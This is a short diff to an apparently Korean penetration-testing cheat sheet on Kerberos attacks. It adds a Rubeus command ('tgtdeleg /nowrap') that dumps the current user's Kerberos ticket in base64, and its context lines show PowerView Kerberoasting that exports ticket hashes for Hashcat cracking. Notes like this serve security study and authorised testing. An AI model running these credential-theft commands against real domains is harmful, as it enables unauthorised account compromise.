@@ -451,6 +451,10 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfre
 
 ### Rubeus
 > C# 기반 Kerberos 공격 도구
+```powershell
+# 현재 사용자의 티켓을 base64로 출력.
+.\rubeus.exe tgtdeleg /nowrap
+```
 
 ```powershell
 # Kerberoasting 가능한 계정 통계 확인
